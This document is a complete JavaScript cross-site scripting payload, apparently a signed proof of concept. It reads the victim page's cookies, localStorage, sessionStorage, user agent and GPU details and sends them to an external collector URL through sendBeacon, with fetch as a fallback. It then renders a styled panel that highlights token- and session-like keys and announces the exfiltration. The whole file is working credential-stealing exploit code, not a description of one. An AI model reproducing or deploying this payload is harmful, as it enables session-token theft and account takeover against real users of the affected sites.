// WILD XSS — Raman_MG signature. Renders a self-documenting evidence panel (screenshot-ready)
// and exfiltrates the captured data to a persistent collector via sendBeacon (no CORS, clean console).
(() => {
  const COLLECTOR = "https://rmg-collector.ramanmgg1.workers.dev/"; // https://rmg-collector.<sub>.workers.dev/
  // ---- collect ----
  const cvs = document.createElement("canvas"),
    gl = cvs.getContext("webgl") || cvs.getContext("experimental-webgl"),
    dbg = gl && gl.getExtension("WEBGL_debug_renderer_info"),
    gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A",
    vendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : "N/A";
  const ls = { ...localStorage }, ss = { ...sessionStorage };
  const cookieList = document.cookie ? document.cookie.split(";").map(s => s.trim()).filter(Boolean) : [];
  const data = {
    origin: location.origin, host: location.host, path: location.pathname, url: location.href,
    cookies: document.cookie, userAgent: navigator.userAgent,
    localStorage: ls, sessionStorage: ss, historyLength: history.length, gpu, vendor,
    capturedAt: new Date().toISOString()
  };
  // ---- exfil (sendBeacon primary; fetch keepalive fallback) ----
  const payload = "msg=" + encodeURIComponent(JSON.stringify(data));
  let sent = false;
  try { sent = navigator.sendBeacon(COLLECTOR, new Blob([payload], { type: "application/x-www-form-urlencoded" })); } catch (e) {}
  if (!sent) { try { fetch(COLLECTOR, { method: "POST", mode: "cors", keepalive: true, headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: payload }); } catch (e) {} }

  // ---- self-documenting on-screen evidence panel (Shadow DOM: fully isolated from the page's hostile CSS) ----
  const clip = (v, n) => { v = String(v == null ? "" : v); return v.length > n ? v.slice(0, n) + "…" : v; };
  const enc = s => String(s == null ? "" : s).replace(/[&<>]/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]));
  const HOT = /token|auth|session|jwt|secret|key|bearer|sid|sso|hammer|access|refresh|cred/i;
  const lsKeys = Object.keys(ls), ssKeys = Object.keys(ss);
  const kvTable = obj => { const ks = Object.keys(obj); return ks.length
    ? ks.slice(0, 16).map(k => "<tr><td class='k" + (HOT.test(k) ? " hot" : "") + "'>" + enc(clip(k, 34)) + "</td><td class='v'>" + enc(clip(obj[k], 90)) + "</td></tr>").join("") + (ks.length > 16 ? "<tr><td class='k'></td><td class='v'>…+" + (ks.length - 16) + " more</td></tr>" : "")
    : "<tr><td class='v' style='color:#456'>— none —</td></tr>"; };
  const ckTable = cookieList.length
    ? cookieList.slice(0, 16).map(c => { const k = c.split("=")[0]; return "<tr><td class='k" + (HOT.test(k) ? " hot" : "") + "'>" + enc(clip(k, 34)) + "</td><td class='v'>" + enc(clip(c.slice(k.length + 1), 90)) + "</td></tr>"; }).join("") + (cookieList.length > 16 ? "<tr><td class='k'></td><td class='v'>…+" + (cookieList.length - 16) + " more</td></tr>" : "")
    : "<tr><td class='v' style='color:#456'>— none —</td></tr>";

  // ---- theme (switch with one word) ----
  const THEME = "neon-green"; // "neon-green" | "cyber" | "danger"
  const THEMES = {
    "neon-green": { acc: "#00ff5a", hot: "#ffe000", val: "#a9ffc6", hi: "#eaffe9", bg: "linear-gradient(180deg,#04170c,#000)", glow: "#00ff5a", page: "#000" },
    "cyber":      { acc: "#12f6ff", hot: "#ff36d0", val: "#a9e9ff", hi: "#eafcff", bg: "linear-gradient(180deg,#0a0722,#04010e)", glow: "#12f6ff", page: "#04010e" },
    "danger":     { acc: "#ff3860", hot: "#ffc400", val: "#ffb9c6", hi: "#ffeaef", bg: "linear-gradient(180deg,#1a040a,#0a0000)", glow: "#ff3860", page: "#0a0000" }
  };
  const t = THEMES[THEME] || THEMES["neon-green"];
  try { (document.documentElement).style.background = t.page; } catch (e) {}

  const host = document.createElement("div");
  host.setAttribute("data-xss", "rmg");
  host.style.cssText = "position:absolute;top:20px;left:50%;transform:translateX(-50%);width:780px;max-width:95vw;z-index:2147483647;";
  const root = host.attachShadow({ mode: "open" });
  root.innerHTML =
    "<style>:host{all:initial}*{box-sizing:border-box;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:13px;line-height:1.5}"
    + ".card{background:" + t.bg + ";color:" + t.val + ";border:1.5px solid " + t.acc + ";border-radius:12px;box-shadow:0 0 26px " + t.glow + "aa,0 0 70px " + t.glow + "55,inset 0 0 14px " + t.glow + "22;overflow:hidden}"
    + ".head{background:" + t.acc + ";color:#000;font-weight:800;letter-spacing:.5px;padding:11px 16px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 0 22px " + t.glow + "88;text-shadow:0 0 1px #000}"
    + "table{border-collapse:collapse;width:100%;margin:6px 0}"
    + "td{padding:2px 0;vertical-align:top}td.k{color:" + t.acc + ";padding:2px 14px;white-space:nowrap;width:170px;word-break:break-all;text-shadow:0 0 6px " + t.glow + "66}td.v{color:" + t.val + ";padding-right:16px;word-break:break-all}td.v.hi{color:" + t.hi + ";text-shadow:0 0 8px " + t.glow + "88}"
    + "tr:has(.hot) td{background:" + t.hot + "1a}td.k.hot{color:" + t.hot + ";text-shadow:0 0 8px " + t.hot + "aa}"
    + ".sec{color:#000;background:" + t.acc + ";font-weight:800;margin:10px 0 0;padding:5px 16px;letter-spacing:1px;box-shadow:0 0 16px " + t.glow + "77}"
    + ".sec em{float:right;font-style:normal;opacity:.85}"
    + ".foot{color:" + t.val + ";font-size:11px;padding:12px 16px 14px;border-top:1px dashed " + t.acc + "55;margin-top:8px}.foot b{color:" + t.hot + ";text-shadow:0 0 6px " + t.hot + "88}</style>"
    + "<div class='card'>"
    + "<div class='head'><span>⚡ Wild XSS EXECUTED &nbsp;·&nbsp; by Raman_MG</span><span>" + (sent ? "◉ EXFILTRATED" : "◉ EXFIL (fetch)") + "</span></div>"
    + "<table>"
    + "<tr><td class='k'>ORIGIN</td><td class='v hi'>" + enc(data.origin) + "</td></tr>"
    + "<tr><td class='k'>HOST</td><td class='v hi'>" + enc(data.host) + "</td></tr>"
    + "<tr><td class='k'>PATH</td><td class='v'>" + enc(data.path) + "</td></tr>"
    + "<tr><td class='k'>USER-AGENT</td><td class='v'>" + enc(clip(data.userAgent, 110)) + "</td></tr>"
    + "<tr><td class='k'>GPU</td><td class='v'>" + enc(clip(gpu + " · " + vendor, 110)) + "</td></tr>"
    + "<tr><td class='k'>HISTORY</td><td class='v'>" + data.historyLength + " entries</td></tr>"
    + "<tr><td class='k'>CAPTURED</td><td class='v'>" + enc(data.capturedAt) + "</td></tr>"
    + "</table>"
    + "<div class='sec'>COOKIES <em>" + cookieList.length + "</em></div><table>" + ckTable + "</table>"
    + "<div class='sec'>LOCALSTORAGE <em>" + lsKeys.length + " keys</em></div><table>" + kvTable(ls) + "</table>"
    + "<div class='sec'>SESSIONSTORAGE <em>" + ssKeys.length + " keys</em></div><table>" + kvTable(ss) + "</table>"
    + "<div class='foot'>▸ Every value above was read by attacker-controlled JavaScript running in the <b>" + enc(data.host) + "</b> origin and exfiltrated to an external server. On a logged-in victim, session tokens in these stores are stolen → <b>account takeover</b>.</div>"
    + "</div>";
  const paint = () => (document.body || document.documentElement).appendChild(host);
  document.body ? paint() : addEventListener("DOMContentLoaded", paint);
})();
